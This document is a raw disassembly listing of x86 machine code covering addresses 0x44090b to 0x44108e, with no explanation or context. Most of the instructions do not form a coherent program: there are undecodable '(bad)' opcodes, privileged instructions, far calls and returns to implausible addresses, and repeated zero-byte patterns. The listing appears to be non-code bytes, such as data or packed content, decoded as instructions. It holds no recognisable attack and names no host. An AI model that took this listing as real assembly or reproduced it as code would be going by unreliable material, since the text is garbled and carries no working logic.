  44090b:	test   BYTE PTR [edi+0x2c],ch
  44090e:	or     al,0x8d
  440910:	in     eax,0x33
  440912:	push   ebx
  440913:	jge    0x440951
  440915:	xor    ebx,ecx
  440917:	and    DWORD PTR [esi],0x33
  44091a:	fsubr  QWORD PTR [ebx+0x2e]
  44091d:	xor    edi,DWORD PTR [ebx]
  44091f:	bound  edx,QWORD PTR [eax+0x166a8a32]
  440925:	xor    al,dl
  440927:	pusha  
  440928:	sbb    al,0x32
  44092a:	xor    DWORD PTR [ebx-0x1a],ecx
  44092d:	xor    DWORD PTR [eax+eax*1],ecx
  440930:	add    BYTE PTR [eax],al
  440932:	add    BYTE PTR [eax],al
  440934:	inc    ebx
  440935:	jg     0x440968
  440937:	push   esp
  440938:	dec    ebx
  440939:	inc    esi
  44093a:	xor    DWORD PTR [edx+0x39],eax
  44093d:	push   edi
  44093e:	aaa    
  44093f:	(bad)  
  440940:	scas   eax,DWORD PTR es:[edi]
  440941:	sub    eax,0xf4adb235
  440946:	xor    al,0x4a
  440948:	pushf  
  440949:	jae    0x44097f
  44094b:	in     al,0x9a
  44094d:	clc    
  44094e:	cmp    esp,edx
  440950:	xchg   edx,eax
  440951:	or     edi,DWORD PTR [ecx*1-0x33c42ecb]
  440958:	and    ah,0x3b
  44095b:	mov    ebx,0xa43bea7a
  440960:	jb     0x4408e8
  440962:	cmp    esi,DWORD PTR [ebx+0x35]
  440965:	jns    0x4409a2
  440967:	jg     0x44099e
  440969:	mov    ?,WORD PTR [ebx]
  44096b:	dec    eax
  44096c:	xor    eax,0x2a003b9a
  440971:	ret    0x3caa
  440974:	ss ret 0x3cbf
  440978:	push   ecx
  440979:	ret    0x3ccb
  44097c:	pop    esi
  44097d:	ret    0x3cd1
  440980:	ds sub esp,edx
  440983:	cmp    al,0x60
  440985:	sub    al,0x1c
  440987:	cmp    eax,0x3d2c2b6d
  44098c:	push   0x2b
  44098e:	dec    esi
  44098f:	cmp    eax,0x3d732ba6
  440994:	shr    DWORD PTR [esp+edx*4],cl
  440997:	cmp    eax,0x0
  44099c:	add    BYTE PTR [esi-0xdc268d4],ah
  4409a2:	sub    eax,ecx
  4409a4:	cmp    eax,0x3dfc2c39
  4409a9:	sbb    ebp,DWORD PTR ds:0x2c503e2a
  4409af:	pusha  
  4409b0:	ds jae 0x4409df
  4409b3:	jge    0x4409f3
  4409b5:	scas   al,BYTE PTR es:[edi]
  4409b6:	sub    eax,0x2d4c3ea2
  4409bb:	mov    eax,0xe02ccd3e
  4409c0:	ds icebp 
  4409c2:	sub    al,0xeb
  4409c4:	ds push esi
  4409c6:	sub    eax,0x2dd23f00
  4409cb:	or     al,0x3f
  4409cd:	fisubr WORD PTR ds:0x2daf3f23
  4409d3:	(bad)  
  4409d4:	aas    
  4409d5:	add    BYTE PTR [esi],ch
  4409d7:	enter  0x313f,0x2e
  4409db:	out    dx,al
  4409dc:	aas    
  4409dd:	int3   
  4409de:	outs   dx,BYTE PTR ds:[esi]
  4409df:	stc    
  4409e0:	push   DWORD PTR [edi+edi*8-0x1]
  4409e4:	inc    edi
  4409e6:	sub    DWORD PTR cs:[eax],esi
  4409e9:	ret    
  4409ea:	cmp    esi,DWORD PTR cs:[eax]
  4409ed:	jne    0x440991
  4409ef:	sub    al,0x5e
  4409f1:	gs int 0x2c
  4409f4:	xchg   esp,eax
  4409f5:	inc    ebp
  4409f6:	sub    eax,0x1845b72d
  4409fb:	sub    eax,0x2d2345c8
  440a00:	rol    BYTE PTR [eax],cl
  440a02:	add    BYTE PTR [eax],al
  440a04:	add    BYTE PTR [eax],al
  440a06:	inc    ebp
  440a07:	sti    
  440a08:	sub    al,0xeb
  440a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440a0b:	dec    ebp
  440a0c:	xor    esi,edi
  440a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440a0f:	je     0x440a44
  440a11:	shld   DWORD PTR ds:0x11a43033,eax,0x33
  440a19:	cmp    al,0x84
  440a1b:	mov    eax,0x31846c32
  440a20:	xor    eax,DWORD PTR [edi-0x54cd1e7c]
  440a26:	test   ch,ch
  440a28:	xor    dh,BYTE PTR [ecx+0x41325264]
  440a2e:	addr16 push ss
  440a30:	xor    dl,BYTE PTR [edi+0x67]
  440a33:	clc    
  440a34:	xor    DWORD PTR [ebp-0x2fce4399],edx
  440a3a:	inc    edi
  440a3b:	mov    DWORD PTR [ecx],esi
  440a3d:	jecxz  0x440a86
  440a3f:	lock xor DWORD PTR [ebx],ecx
  440a42:	inc    esi
  440a43:	mov    ah,0x31
  440a45:	dec    eax
  440a46:	inc    esi
  440a47:	push   cs
  440a48:	xor    DWORD PTR [ebp-0x5a],edx
  440a4b:	cmp    dh,BYTE PTR [ecx]
  440a4d:	jne    0x4409f5
  440a4f:	fidiv  DWORD PTR [eax]
  440a51:	pushf  
  440a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440a53:	jp     0x440a85
  440a55:	mov    cl,0xa6
  440a57:	ja     0x440a89
  440a59:	fild   WORD PTR [esi-0x7903ced7]
  440a5f:	jmp    FWORD PTR [edi]
  440a61:	xor    eax,0xda283689
  440a66:	or     edi,0x952e
  440a6c:	add    BYTE PTR [eax],al
  440a6e:	add    BYTE PTR [eax+0x2],ch
  440a71:	dec    eax
  440a72:	xor    esp,edx
  440a74:	das    
  440a75:	sub    al,0x31
  440a77:	push   edx
  440a78:	xor    BYTE PTR [edx],dh
  440a7a:	xor    al,BYTE PTR [ecx+0x3432c831]
  440a80:	xor    DWORD PTR [eax+0x7f311132],esp
  440a86:	xor    bh,cl
  440a88:	xor    DWORD PTR [esi+0x33],ebx
  440a8b:	in     al,0x31
  440a8d:	inc    ecx
  440a8e:	xor    ebp,DWORD PTR [esi]
  440a90:	xor    eax,ecx
  440a92:	xor    bl,BYTE PTR [ecx+0x31]
  440a95:	fidiv  DWORD PTR [edx]
  440a97:	jp     0x440ac3
  440a99:	push   cs
  440a9a:	cmp    al,0xaf
  440a9c:	sub    al,BYTE PTR [ebx+0x3c]
  440a9f:	shr    BYTE PTR [edx],1
  440aa1:	push   edi
  440aa2:	cmp    edx,DWORD PTR [edi]
  440aa4:	sub    cl,ah
  440aa6:	cmp    eax,DWORD PTR [ebx+ebp*1+0x2c773c60]
  440aad:	fstp   TBYTE PTR ds:0x3dc52c91
  440ab3:	mov    dh,0x2c
  440ab5:	outs   dx,BYTE PTR ds:[esi]
  440ab6:	cmp    eax,0x3d4d2bdb
  440abb:	inc    ebx
  440abc:	sub    al,0x82
  440abe:	cmp    eax,0x3f302d4c
  440ac3:	xchg   edx,eax
  440ac4:	sub    eax,0x2ce03ef8
  440ac9:	ds ds es sub eax,0x268937d9
  440ad1:	adc    al,0x38
  440ad3:	add    BYTE PTR [eax],al
  440ad5:	add    BYTE PTR [eax],al
  440ad7:	add    BYTE PTR [esi+0x5237a626],ch
  440add:	test   BYTE PTR es:[edi],dh
  440ae0:	and    ah,BYTE PTR [esi]
  440ae2:	daa    
  440ae3:	aaa    
  440ae4:	shl    BYTE PTR ds:0x279538f0,1
  440aea:	icebp  
  440aeb:	cmp    BYTE PTR [ebx+0x7db80027],al
  440af1:	out    0x3a,al
  440af3:	pop    edi
  440af4:	ins    DWORD PTR es:[edi],dx
  440af5:	mov    ds:0xbe6cc93a,eax
  440afa:	cmp    ecx,eax
  440afc:	pop    esp
  440afd:	jge    0x440b38
  440aff:	dec    ecx
  440b00:	pop    esp
  440b01:	cdq    
  440b02:	cmp    ebp,edi
  440b04:	dec    ebp
  440b05:	add    bh,BYTE PTR [ecx]
  440b07:	cmc    
  440b08:	dec    edi
  440b09:	idiv   DWORD PTR [eax]
  440b0b:	les    edi,FWORD PTR [edi]
  440b0d:	xor    edi,DWORD PTR [ecx]
  440b0f:	fwait
  440b10:	aas    
  440b11:	repz cmp dl,dh
  440b14:	lods   al,BYTE PTR ds:[esi]
  440b15:	add    al,BYTE PTR [eax]
  440b17:	jmp    0x4a3c7412
  440b1c:	jbe    0x440b20
  440b1e:	add    BYTE PTR [edx],bl
  440b20:	mov    eax,ds:0x89752f84
  440b25:	test   eax,0x5a81a02f
  440b2a:	das    
  440b2b:	call   0x6072e6b7
  440b30:	xchg   BYTE PTR [edi+0x6466772e],cl
  440b36:	cs in  eax,0x60
  440b39:	loopne 0x440b68
  440b3b:	cmp    al,BYTE PTR [eax]
  440b3d:	add    BYTE PTR [eax],al
  440b3f:	add    BYTE PTR [eax],al
  440b41:	push   0x674a33f4
  440b46:	stos   BYTE PTR es:[edi],al
  440b47:	xor    DWORD PTR [eax+0x25317447],ecx
  440b4d:	inc    esp
  440b4e:	fdiv   DWORD PTR [eax]
  440b50:	ins    DWORD PTR es:[edi],dx
  440b51:	inc    esp
  440b52:	cwde   
  440b53:	xor    BYTE PTR [eax-0x2acfc0bc],ch
  440b59:	scas   al,BYTE PTR es:[edi]
  440b5a:	sbb    DWORD PTR [eax],edi
  440b5c:	fisubr WORD PTR [esi-0x5e9bc819]
  440b62:	jbe    0x440b9b
  440b64:	jnp    0x440aff
  440b66:	xchg   esp,eax
  440b67:	aaa    
  440b68:	jb     0x440afb
  440b6a:	mov    ds:0x26f90037,al
  440b6f:	mov    ds:0xb426f338,al
  440b74:	cmp    BYTE PTR [ebp+0x26],al
  440b77:	mov    dh,0x38
  440b79:	pop    edi
  440b7a:	es enter 0x6138,0x26
  440b7f:	retf   0x6b38
  440b82:	fdivr  QWORD PTR es:[eax]
  440b85:	ins    DWORD PTR es:[edi],dx
  440b86:	fidivr WORD PTR es:[eax]
  440b89:	ja     0x440bb1
  440b8b:	lock cmp BYTE PTR [ecx-0x7cc70dd5],cl
  440b92:	sub    eax,DWORD PTR [ecx+edi*1]
  440b95:	xchg   ebp,eax
  440b96:	sub    al,0x6
  440b98:	cmp    DWORD PTR [edi+0x2c],ecx
  440b9b:	sbb    BYTE PTR [ecx],bh
  440b9d:	jno    0x440bca
  440b9f:	sbb    bh,BYTE PTR [ecx]
  440ba1:	jnp    0x440bce
  440ba3:	sub    al,0x39
  440ba5:	add    BYTE PTR [eax],al
  440ba7:	add    BYTE PTR [eax],al
  440ba9:	add    BYTE PTR [ebp+0x2b],bh
  440bac:	cmp    DWORD PTR cs:[edi+0x2b],esp
  440bb0:	inc    eax
  440bb1:	cmp    DWORD PTR [ecx-0x6cc6bdd5],ebx
  440bb7:	sub    edx,DWORD PTR [ecx+edi*1+0x65]
  440bbb:	sub    edx,DWORD PTR [esi+0x39]
  440bbe:	mov    edi,0x8139682b
  440bc3:	sub    ebp,DWORD PTR [edx+0x39]
  440bc6:	mov    ebp,DWORD PTR [ebx]
  440bc8:	jl     0x440c03
  440bca:	lea    ebp,[esi+edi*2]
  440bcd:	cmp    DWORD PTR [edi-0x56c66fd4],edx
  440bd3:	sub    al,0x92
  440bd5:	cmp    DWORD PTR [ebx-0x4ac65bd4],esp
  440bdb:	sub    al,0xa6
  440bdd:	cmp    DWORD PTR [edi+0x1139b82c],ebp
  440be3:	sub    al,0xba
  440be5:	cmp    DWORD PTR [ebx+0x7539cc2c],ebx
  440beb:	sub    dh,BYTE PTR [esi]
  440bed:	ror    BYTE PTR [esp+esi*1-0x49731fca],cl
  440bf4:	xor    eax,0x35b87ce6
  440bf9:	hlt    
  440bfa:	jl     0x440c2e
  440bfc:	ss cli 
  440bfe:	ins    BYTE PTR es:[edi],dx
  440bff:	pop    esp
  440c00:	cmp    cl,BYTE PTR [eax]
  440c02:	outs   dx,DWORD PTR ds:[esi]
  440c03:	outs   dx,BYTE PTR ds:[esi]
  440c04:	cmp    cl,BYTE PTR [esi]
  440c06:	pop    edi
  440c07:	jo     0x440c43
  440c09:	sbb    al,0x5f
  440c0b:	cmp    bh,BYTE PTR [edx]
  440c0d:	and    al,BYTE PTR [eax]
  440c0f:	add    BYTE PTR [eax],al
  440c11:	add    BYTE PTR [eax],al
  440c13:	dec    edi
  440c14:	inc    esp
  440c15:	cmp    dh,BYTE PTR [eax]
  440c17:	dec    edi
  440c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440c19:	cmp    dh,BYTE PTR [esi]
  440c1b:	aas    
  440c1c:	test   al,0x3a
  440c1e:	inc    esp
  440c1f:	aas    
  440c20:	mov    ds:0x88af4a3a,al
  440c25:	cmp    bl,BYTE PTR [eax-0x51]
  440c28:	mov    esi,0xbc9f5e35
  440c2d:	xor    eax,0x35ca9f6c
  440c32:	jb     0x440bc3
  440c34:	shl    BYTE PTR ds:0x35d68f80,1
  440c3a:	xchg   BYTE PTR [edi-0x2c],bh
  440c3d:	xor    eax,0x35d27f94
  440c42:	call   0xce6f:0xa835786f
  440c49:	xor    eax,0x35cc5fae
  440c4e:	mov    esp,0xc835985f
  440c53:	dec    edi
  440c54:	lods   eax,DWORD PTR ds:[esi]
  440c55:	xor    eax,0x35784fd5
  440c5a:	out    0x3f,eax
  440c5c:	jmp    0x440c93
  440c5e:	repnz aas 
  440c60:	out    dx,al
  440c61:	xor    eax,0x3561affd
  440c66:	adc    BYTE PTR [esi+0x7f3b0002],ch
  440c6c:	sub    DWORD PTR [edx],ecx
  440c6e:	cmp    esp,DWORD PTR [ecx+ebp*1+0x29903b14]
  440c75:	mov    al,ds:0x3a
  440c7a:	add    BYTE PTR [eax],al
  440c7c:	addr16 es in al,0x37
  440c80:	jle    0x440ca8
  440c82:	jle    0x440cbc
  440c84:	sahf   
  440c85:	daa    
  440c86:	repnz xor eax,0x371e251b
  440c8c:	jne    0x440c90
  440c8e:	out    0x93,eax
  440c90:	mov    ds:0x7503fa65,eax
  440c95:	add    al,BYTE PTR [ecx+0x34]
  440c98:	ins    BYTE PTR es:[edi],dx
  440c99:	xor    BYTE PTR [ebp+0x32],dl
  440c9c:	sub    eax,0xd33b4e2f
  440ca1:	sub    DWORD PTR [edx+0x38],ecx
  440ca4:	(bad)  
  440ca5:	add    BYTE PTR es:[ecx],bh
  440ca8:	gs daa 
  440caa:	out    0xa3,eax
  440cac:	imul   esp,DWORD PTR [ebp+0x1e],0x4
  440cb0:	jne    0x440cb4
  440cb2:	addr16 xor esi,esp
  440cb5:	xor    edi,edx
  440cb7:	xor    DWORD PTR [eax+esi*1-0x5],eax
  440cbb:	xor    dl,BYTE PTR [eax]
  440cbd:	sub    al,0x29
  440cbf:	cmp    ah,dl
  440cc1:	daa    
  440cc2:	cli    
  440cc3:	cmp    bl,BYTE PTR [edx+0x4e3a8729]
  440cc9:	sub    ecx,ecx
  440ccb:	aaa    
  440ccc:	xchg   edi,eax
  440ccd:	es dec ebp
  440ccf:	aaa    
  440cd0:	or     al,0x26
  440cd2:	xlat   BYTE PTR ds:[ebx]
  440cd3:	cmp    ch,bl
  440cd5:	and    DWORD PTR es:[esi],esi
  440cd8:	pop    eax
  440cd9:	and    eax,0x258d371b
  440cde:	cwde   
  440cdf:	add    BYTE PTR ss:[eax],al
  440ce2:	add    BYTE PTR [eax],al
  440ce4:	add    BYTE PTR [ebp+0x2],dh
  440ce7:	out    0xb3,eax
  440ce9:	sti    
  440cea:	fs call eax
  440ced:	jns    0x440cf1
  440cef:	add    dl,bl
  440cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440cf2:	pop    ds
  440cf3:	xor    BYTE PTR [esi+0x323395a6],dh
  440cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440cfa:	cmp    esi,DWORD PTR [edx]
  440cfc:	cmp    al,BYTE PTR [ebp-0x7acdcdad]
  440d02:	dec    ebx
  440d03:	xor    cl,BYTE PTR [edx-0x7b]
  440d06:	arpl   WORD PTR [edx],si
  440d08:	push   edx
  440d09:	test   DWORD PTR [ebx+0x32],ebx
  440d0c:	cmp    ah,BYTE PTR [ebp+0x73]
  440d0f:	xor    dh,BYTE PTR [edx]
  440d11:	imul   esi,DWORD PTR gs:[edx],0xffffffea
  440d15:	push   eax
  440d16:	add    esi,DWORD PTR [edx]
  440d18:	repnz dec eax
  440d1a:	sti    
  440d1b:	xor    edx,edi
  440d1d:	pusha  
  440d1e:	adc    esi,DWORD PTR [edx]
  440d20:	repnz pop eax
  440d22:	or     esi,DWORD PTR [edx]
  440d24:	retf   0x2350
  440d27:	xor    dl,dl
  440d29:	dec    eax
  440d2a:	sbb    esi,DWORD PTR [edx]
  440d2c:	mov    edx,0xb23231a0
  440d31:	cwde   
  440d32:	sub    DWORD PTR [edx],esi
  440d34:	sub    dl,BYTE PTR [ebx-0x74cdce3f]
  440d3a:	mov    ecx,0xd1a33a31
  440d3f:	xor    DWORD PTR [edx],esi
  440d41:	fwait
  440d42:	leave  
  440d43:	xor    DWORD PTR [edx-0x6d],ecx
  440d46:	loope  0x440d79
  440d48:	push   edx
  440d49:	add    BYTE PTR [eax],al
  440d4b:	add    BYTE PTR [eax],al
  440d4d:	add    BYTE PTR [ebx+0x633a31d9],cl
  440d53:	icebp  
  440d54:	xor    DWORD PTR [edx],esi
  440d56:	pop    ebx
  440d57:	jmp    0x8197778d
  440d5c:	xor    DWORD PTR [edx+0x4b],esi
  440d5f:	jns    0x440d92
  440d61:	jp     0x440dc6
  440d63:	xchg   ecx,eax
  440d64:	xor    DWORD PTR [edx+0x5b],esi
  440d67:	mov    DWORD PTR [ecx],esi
  440d69:	add    BYTE PTR [edi-0x58c960ec],ch
  440d6f:	adc    al,0xa7
  440d71:	ss scas eax,DWORD PTR es:[edi]
  440d73:	adc    al,0xaf
  440d75:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  440d77:	adc    al,0xb7
  440d79:	ss (bad) 
  440d7b:	adc    al,0xbf
  440d7d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  440d7f:	adc    al,0xc7
  440d81:	ss (bad) 
  440d83:	adc    al,0xcf
  440d85:	xchg   DWORD PTR ss:[edi+edx*8],edx
  440d89:	ss das 
  440d8b:	adc    al,0xdf
  440d8d:	ss daa 
  440d8f:	adc    al,0xe7
  440d91:	ss mov bh,0x16
  440d94:	addr16 aaa 
  440d96:	out    dx,eax
  440d97:	push   ss
  440d98:	outs   dx,DWORD PTR ds:[esi]
  440d99:	aaa    
  440d9a:	xlat   BYTE PTR ds:[ebx]
  440d9b:	push   ss
  440d9c:	ja     0x440dd5
  440d9e:	unpckhps xmm7,XMMWORD PTR [edi+0x37]
  440da2:	pop    ss
  440da3:	adc    eax,0x150f3787
  440da8:	(bad)  
  440da9:	aaa    
  440daa:	pop    ss
  440dab:	adc    eax,0x152f3797
  440db0:	lahf   
  440db1:	aaa    
  440db2:	add    BYTE PTR [eax],al
  440db4:	add    BYTE PTR [eax],al
  440db6:	add    BYTE PTR [edi-0x50c858eb],dh
  440dbc:	adc    eax,0x161737af
  440dc1:	mov    bh,0x37
  440dc3:	movhps xmm7,QWORD PTR [edi-0x38e9e8c9]
  440dca:	aaa    
  440dcb:	movlhps xmm1,xmm7
  440dce:	aaa    
  440dcf:	pop    ss
  440dd0:	push   ss
  440dd1:	xlat   BYTE PTR ds:[ebx]
  440dd2:	aaa    
  440dd3:	das    
  440dd4:	push   ss
  440dd5:	fbstp  TBYTE PTR [edi]
  440dd7:	aaa    
  440dd8:	push   ss
  440dd9:	out    0x37,eax
  440ddb:	out    dx,eax
  440ddc:	adc    eax,0x15d737ef
  440de1:	div    DWORD PTR [edi]
  440de3:	(bad)  
  440de5:	push   DWORD PTR [edi]
  440de7:	jne    0x440e49
  440de9:	xor    al,0x9
  440deb:	dec    ebp
  440dec:	push   0x603d1134
  440df1:	xor    al,0x19
  440df3:	cmp    eax,0xad213438
  440df8:	popf   
  440df9:	xor    al,0x98
  440dfb:	scas   eax,DWORD PTR es:[edi]
  440dfc:	mov    dh,BYTE PTR [edx]
  440dfe:	xor    eax,0x9f33a6a2
  440e03:	call   0x33c8:0x92ea3423
  440e0a:	add    BYTE PTR [ebp+0x59],dh
  440e0d:	cmp    al,0xfe
  440e0f:	ret    0xfd54
  440e12:	push   DWORD PTR [ebp+0x56]
  440e15:	sub    al,0x5d
  440e17:	gs out 0x2c,al
  440e1a:	fld    QWORD PTR [eax]
  440e1c:	add    BYTE PTR [eax],al
  440e1e:	add    BYTE PTR [eax],al
  440e20:	gs and al,0x2d
  440e23:	or     DWORD PTR [eax+esi*4+0x2d],esp
  440e27:	popa   
  440e28:	fs pop esi
  440e2a:	cs or  eax,0x2a2e3547
  440e30:	inc    edi
  440e31:	call   0x6d2f:0xa8460f2e
  440e38:	inc    eax
  440e39:	(bad)  
  440e3a:	sub    DWORD PTR [eax-0x41d63658],esp
  440e40:	mov    al,ds:0xa8ef29f7
  440e45:	pop    edx
  440e46:	ss aaa 
  440e48:	mov    ds:0x8bfe35c4,eax
  440e4d:	pushf  
  440e4e:	xor    al,0xd6
  440e50:	add    BYTE PTR [edi+0x34],0xf3
  440e54:	mov    ch,BYTE PTR [ebx+0x24]
  440e57:	add    eax,0x1924367d
  440e5c:	ins    DWORD PTR es:[edi],dx
  440e5d:	pop    edx
  440e5e:	and    al,0x3b
  440e60:	ins    DWORD PTR es:[edi],dx
  440e61:	sub    BYTE PTR [ebx+edx*2],ch
  440e64:	pop    ebp
  440e65:	add    cl,BYTE PTR [esp+ebp*1]
  440e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440e69:	sbb    bl,BYTE PTR [edi]
  440e6b:	sub    al,0xf6
  440e6d:	sbb    ah,BYTE PTR [edx+0x2c]
  440e70:	out    dx,al
  440e71:	sbb    al,BYTE PTR [esi+0x2c]
  440e74:	rcr    DWORD PTR [edx],0xa6
  440e77:	sub    al,0x29
  440e79:	sbb    edx,DWORD PTR [esi-0x78e532d4]
  440e7f:	sub    al,0xd3
  440e81:	sbb    dh,BYTE PTR [ebx+0x2c]
  440e84:	add    BYTE PTR [eax],al
  440e86:	add    BYTE PTR [eax],al
  440e88:	add    BYTE PTR [ebx+ebx*1-0x5],dh
  440e8c:	sub    al,0x83
  440e8e:	sbb    eax,DWORD PTR [edi]
  440e90:	sub    eax,0x2d1b1b97
  440e95:	mov    ds,WORD PTR [ebx]
  440e97:	mov    ds:0xa31b3b2c,eax
  440e9c:	sub    al,0x18
  440e9e:	sbb    ecx,esi
  440ea0:	sub    al,0x22
  440ea2:	sbb    ebp,DWORD PTR [edi+0x5f1b2a2c]
  440ea8:	sub    eax,0x2d471bef
  440ead:	aam    0x1b
  440eaf:	dec    edx
  440eb0:	sub    eax,0x2d261bc6
  440eb5:	mov    al,0x1b
  440eb7:	xor    eax,0x101b9d2d
  440ebc:	sub    eax,0x2cf21b8c
  440ec1:	outs   dx,BYTE PTR ds:[esi]
  440ec2:	sbb    ebp,ecx
  440ec4:	sub    eax,0x2dd11c7c
  440ec9:	xchg   esi,eax
  440eca:	sbb    al,0x14
  440ecc:	mov    eax,cs:0xd92e1d1c
  440ed2:	sbb    al,0x8e
  440ed4:	sub    eax,0x2dc31c3a
  440ed9:	test   eax,0xf92e871d
  440ede:	sbb    al,0xa2
  440ee0:	cs inc esp
  440ee2:	sbb    eax,0xf75adb00
  440ee7:	cmp    esp,DWORD PTR [edx+edx*2-0x5a]
  440eeb:	cmp    esp,DWORD PTR [ebp+0x0]
  440eee:	add    BYTE PTR [eax],al
  440ef0:	add    BYTE PTR [eax],al
  440ef2:	dec    edx
  440ef3:	dec    ebp
  440ef4:	cmp    eax,edx
  440ef6:	bound  ebx,QWORD PTR [ecx+0x3b]
  440ef9:	call   0xd57f0a43
  440efe:	inc    ebp
  440eff:	sbb    BYTE PTR [ebx],bh
  440f01:	scas   eax,DWORD PTR es:[edi]
  440f02:	inc    ebp
  440f03:	ss cmp dl,al
  440f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440f07:	ret    
  440f08:	cmp    DWORD PTR [edx],edx
  440f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440f0b:	sar    BYTE PTR [ecx],0x6a
  440f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440f0f:	mov    BYTE PTR [ecx],bh
  440f11:	mov    eax,ds:0xf33954a4
  440f16:	xchg   DWORD PTR [ebx],ebx
  440f18:	cmp    eax,ecx
  440f1a:	xchg   ecx,ebx
  440f1c:	cmp    BYTE PTR [edi],bl
  440f1e:	xchg   DWORD PTR [edi],edi
  440f20:	cmp    cl,ch
  440f22:	es pusha 
  440f24:	clc    
  440f25:	sub    DWORD PTR [esi+0x2],esi
  440f28:	add    ch,ah
  440f2a:	data16 jbe 0x440f5c
  440f2d:	push   ebx
  440f2e:	dec    dx
  440f30:	das    
  440f31:	inc    ebp
  440f32:	pop    ax
  440f34:	das    
  440f35:	out    dx,al
  440f36:	dec    ecx
  440f37:	push   ss
  440f38:	das    
  440f39:	xlat   BYTE PTR ds:[ebx]
  440f3a:	inc    ecx
  440f3b:	lds    ebp,FWORD PTR [esi]
  440f3d:	ins    BYTE PTR es:[edi],dx
  440f3e:	dec    ecx
  440f3f:	dec    ecx
  440f40:	and    BYTE PTR cs:[ecx-0x4a],al
  440f44:	sub    eax,0x2cf5a814
  440f49:	push   cs
  440f4a:	mov    ds:0xaa063395,eax
  440f4f:	pop    esi
  440f50:	xor    edi,edi
  440f52:	mov    ds:0x26332f,eax
  440f57:	add    BYTE PTR [eax],al
  440f59:	add    BYTE PTR [eax],al
  440f5b:	mov    dl,al
  440f5d:	xor    bl,BYTE PTR [ecx-0x7e]
  440f60:	shl    DWORD PTR [edx],1
  440f62:	pusha  
  440f63:	mov    ch,BYTE PTR [ebx+0x180e0032]
  440f69:	int3   
  440f6a:	xor    eax,0x35f817d7
  440f6f:	sbb    ebx,DWORD PTR [edx]
  440f71:	push   ss
  440f72:	ss jge 0x440f91
  440f75:	push   0x9e1c9f36
  440f7a:	rcr    BYTE PTR ss:[ebp*4-0xee35fca],0x36
  440f83:	sbb    ecx,DWORD PTR ss:[edi+esi*1-0x7]
  440f88:	sbb    al,BYTE PTR [ebx-0x36e5dbc9]
  440f8e:	aaa    
  440f8f:	clc    
  440f90:	sbb    ecx,esp
  440f92:	aaa    
  440f93:	pop    ebp
  440f94:	sbb    DWORD PTR [eax+edi*1],esi
  440f97:	mov    ebp,0x5338762b
  440f9c:	cs stos DWORD PTR es:[edi],eax
  440f9e:	cmp    BYTE PTR [ebx],bh
  440fa0:	cs jmp 0xa339:0x1d2cc438
  440fa8:	sub    al,0x90
  440faa:	cmp    esi,edi
  440fac:	sub    ebx,edx
  440fae:	cmp    DWORD PTR [esi+0x7b3a102d],edx
  440fb4:	xor    BYTE PTR [ebp+0x3a],dh
  440fb7:	wrmsr  
  440fb9:	mov    al,0x3a
  440fbb:	xor    esi,DWORD PTR [eax]
  440fbd:	idiv   BYTE PTR [edx]
  440fbf:	add    BYTE PTR [eax],al
  440fc1:	add    BYTE PTR [eax],al
  440fc3:	add    BYTE PTR [edi-0x35c4b8d2],al
  440fc9:	cs jo  0x441007
  440fcc:	hlt    
  440fcd:	cs cwde 
  440fcf:	cmp    ebp,DWORD PTR [ebx+0x143bc42d]
  440fd5:	das    
  440fd6:	dec    edi
  440fd7:	cmp    al,0xe1
  440fd9:	das    
  440fda:	outs   dx,BYTE PTR ds:[esi]
  440fdb:	cmp    al,0xf6
  440fdd:	add    edi,DWORD PTR cs:0x3da52f9c
  440fe4:	jne    0x440f77
  440fe6:	sub    ebp,edi
  440fe8:	cmp    BYTE PTR [ecx+0x2e],0x3e
  440fec:	jp     0x441057
  440fee:	pop    esp
  440fef:	(bad)  
  440ff0:	xor    bh,BYTE PTR [ebp-0x4]
  440ff3:	push   DWORD PTR [ebp+0x37]
  440ff6:	sub    eax,0x2cc66440
  440ffb:	mov    BYTE PTR [ecx+eax*2+0x2d],ah
  440fff:	adc    eax,DWORD PTR [esi+0x4b]
  441002:	xor    esi,DWORD PTR [esi+eax*2]
  441005:	daa    
  441006:	xor    edx,DWORD PTR [esi+eax*2+0x5f]
  44100a:	xor    edi,DWORD PTR [esi+eax*2-0x42]
  44100e:	xor    edx,DWORD PTR [ebp-0x3fcc325a]
  441014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441015:	jnp    0x44104a
  441017:	fsub   DWORD PTR [esi-0x5ef3cc2c]
  44101d:	pop    edi
  44101e:	xor    BYTE PTR [ecx+ecx*4],ch
  441021:	sti    
  441022:	aaa    
  441023:	inc    esp
  441024:	and    DWORD PTR [ebx+0x6030],0x89000000
  44102e:	cmp    al,0x30
  441030:	jl     0x440fb3
  441032:	jmp    0x441064
  441034:	xchg   ebx,eax
  441035:	imul   esp,esp,0x2c61b430
  44103b:	xor    eax,ebx
  44103d:	imul   ebx,DWORD PTR [ecx],0x5861ff31
  441043:	xor    DWORD PTR [eax+ecx*2],esi
  441046:	popf   
  441047:	xor    DWORD PTR [edx-0x16ce45c0],eax
  44104d:	dec    eax
  44104e:	pop    edi
  44104f:	aaa    
  441050:	inc    DWORD PTR [ebx-0x72]
  441053:	aaa    
  441054:	jp     0x441000
  441056:	mov    ebp,0xfea2a737
  44105b:	aaa    
  44105c:	push   ds
  44105d:	popf   
  44105e:	shl    BYTE PTR [edx*4+0x2c8f029d],1
  441065:	and    ebx,DWORD PTR [ebx]
  441067:	sahf   
  441068:	sub    al,0xb
  44106a:	sbb    esi,DWORD PTR [esp+ebp*1+0x2d161b6a]
  441071:	cmp    BYTE PTR [edx*8+0x3a189e29],bl
  441078:	sub    dh,bh
  44107a:	sbb    BYTE PTR [ecx+0x2a],bl
  44107d:	out    0x18,eax
  44107f:	test   al,0x2a
  441081:	or     eax,0x6d2aee19
  441086:	sbb    DWORD PTR ds:0x6619ae2b,ebp
  44108c:	sub    ebp,eax
  44108e:	sbb    DWORD PTR [eax+0x2b],edx
